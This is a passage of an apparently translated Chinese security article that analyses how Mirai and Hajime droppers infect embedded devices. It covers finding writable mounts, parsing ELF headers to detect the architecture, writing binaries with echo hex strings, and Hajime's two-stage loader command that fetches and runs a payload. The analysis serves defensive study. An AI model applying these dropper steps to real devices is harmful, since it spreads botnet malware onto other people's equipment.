需要注意的是，绝大多数的嵌入式设备都不支持grep命令，因此cat /proc/mounts | grep
rw命令不能正常工作。相反dropper将读取cat命令的完整输出，然后从中寻找rw字符串。
Mirai和Hajime采用这种方式寻找合适的文件夹存储和运行文件。我们来看看Mirai执行的命令。
你看到圈出的这行后面的TOKEN_QUERY了吗？你可以在找到该文件预定义的内容，如下图所示。
    #define TOKEN_QUERY     "/bin/busybox ECCHI"
    #define TOKEN_RESPONSE  "ECCHI: applet not found"
现在我们已经知道TOKEN_QUERY就是"/bin/busybox ECCHI"。
**摸清目标设备架构**
**现在，dropper需要弄清楚想要感染的嵌入式设备的架构，便于下载正确的二进制文件。**
一般来说，您不会在嵌入式设备中使用readelf或file等命令判断目标设备的架构（因为有很多设备不支持这些命令），因此你需要通过其他的方式判断其架构。
在这里，我们可以通过解析ELF文件头的方式判断其架构。
为了做到这一点，dropper通常会cat一个已知的二进制文件。大多数的选择是/bin/echo。举个例子，我们看看Mirai的代码（也可以在文末的参考文献中看看Hajime是怎么处理的）
你可以在上面的代码片段中看到状态如何设置为下一个循环（TELNET_DETECT_ARCH），然后命令发送到服务器并循环迭代完成。
在下一次迭代中，TELNET_DETECT_ARCH将被触发，并且cat的输出将被读取并处理。
你可以在这里找到检查架构的代码
正如我所说，Mirai做的是解析ELF头，并检查e_machine和e_ident字段来找出架构。
它将一个指针指向从socket链接读取到Elf_hdr结构体的缓冲区，然后只是访问这些字段。看看代码，Mirai实际上对ARM子类型进行了额外的检查。
**如何传输文件**
**现在，我们要弄清楚的是dropper如何将恶意软件传输到嵌入式设备。**
例如Mirai，先检查wget、tftp等命令是否存在（使用我们上面提到的技术即可判断）。你可以在下面的代码中看到详细的信息。
当其中一个工具可用是，我们就可以用他下载恶意软件，但是有时候这些命令都不能用的话，像Mirai采用的echo方法就很有必要了。
**使用echo传输文件**
So，这个echo方法到底是怎么工作的呢？很简单，仅仅是将一对16进制的字符串echo到一个文件中。像下面这样
    echo -ne "x7fx45x4cx46x..." > malware
但是，这只适用于非常小的二进制文件。对于较大的二进制文件，您可能必须将echo命令分成多个部分，并使用>>附加重定向将每个部分的内容追加写入到结果文件中。
**看看Hajime恶意软件是怎么做的**
Hajime案例是非常有趣的，因为它将释放恶意软件分为两个阶段。
首先部署了一个非常小的ELF二进制文件。这个二进制文件将会下载真正的恶意软件。它连接到预定义的服务器，接受真正的恶意软件内容。
    cp .s .i; >.i; ./.s>.i; ./.i; rm .s; /bin/busybox ECCHI
.s即为使用echo命令下载的小型ELF文件。此文件此前由dropper下载好，具有执行权限。上述的shell代码将会执行如下操作。
**cp .s .i 复制小ELF文件（这个文件将下载一个真正的恶意软件）从.s到.i。**
大家都知道文件名称前面带个“.”就是隐藏文件的意思（你可以使用ls
-a命令查看到这些隐藏文件。）这可以使复制前后的文件具有相同的权限。这基本上意味着下载最终的恶意软件后，我们就不用做chmod 777 .i就拥有执行权限。
**>.i. 这个命令的意思是截断文件的内容。
**换句话说，这是一种删除文件的所有内容并将其文件大小设置为0，保留文件权限。所以现在我们有一个具有执行权限的空文件。
**./.s >.i **这个命令的意思就更明显了。现在它已经运行了一个下载器（这个下载器就是前面说的小的ELF文件，通过echo创建的），
**将下载的内容重定向他的标准输出到一个空的可执行文件.i中** 。正如我们上面所说，
该下载器连接到服务器，无论远程服务器响应任何内容，都将信息转储到stdout。可以将其想象成阉割版的wget。
**./.i;rm .s 这句命令的功能是将下载的恶意文件执** **行，并将前文的下载器从磁盘上移除。**
主恶意软件像一个守护进程，当开始执行./.i，程序将执行，下载器将删除。
到此为止，恶意软件已成功在目标设备中植入。
**总结**
文章到这里就基本结束了。希望大家读后能有所收获，如果这对你来说是一个新的领域，你将学习到一些东西。请自由分享你的意见，并在下面的评论中提出你的见解。
**参考文献**
本文内容基于以下内容提供信息：
Mirai 源代码：[https://github.com/jgamblin/Mirai-Source-Code/tree/master/loader/src](https://github.com/jgamblin/Mirai-Source-Code/tree/master/loader/src)
Hajime
分析：[https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf](https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf)
**传送门**
* * *
[**从此次美国遭遇大规模DDOS攻击事件看IOT时代的网络安全问题**](http://bobao.360.cn/news/detail/3678.html)
[**【技术分享】关于mirai僵尸网络控制主机的数据分析**](http://bobao.360.cn/learning/detail/3143.html)